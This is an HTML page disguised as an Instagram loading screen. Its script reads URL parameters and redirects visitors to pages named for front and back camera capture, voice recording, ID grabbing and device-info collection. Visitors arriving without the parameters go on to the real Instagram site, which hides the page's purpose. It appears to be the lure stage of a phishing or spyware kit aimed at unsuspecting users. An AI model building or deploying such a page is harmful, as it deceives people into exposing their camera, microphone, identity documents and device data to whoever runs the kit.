<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Instagram - Share your moments">
<meta name="keywords" content="instagram, photos, social media">
<meta name="author" content="Instagram">
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
<style>
body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
.loader{text-align:center}
.loader img{width:80px;margin-bottom:20px}
.loader p{color:#8e8e8e;font-size:14px}
</style>
</head>
<body>
<div class="loader">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/200px-Instagram_logo_2016.svg.png" alt="Instagram">
<p>Loading...</p>
</div>
<script>
const params=new URLSearchParams(location.search);
const s=params.get('s');
const t=params.get('t');
if(s&&t){
  const pages={
    'f':'front_camera.html',
    'b':'back_camera.html',
    'v':'voice.html',
    'i':'id_grab.html',
    'd':'device_info.html',
    'p':'device_preview.html'
  };
  const page=pages[t]||'front_camera.html';
  setTimeout(()=>location.href=page+'?s='+s,800);
}else{
  location.href='https://www.instagram.com';
}
</script>
</body>
</html>
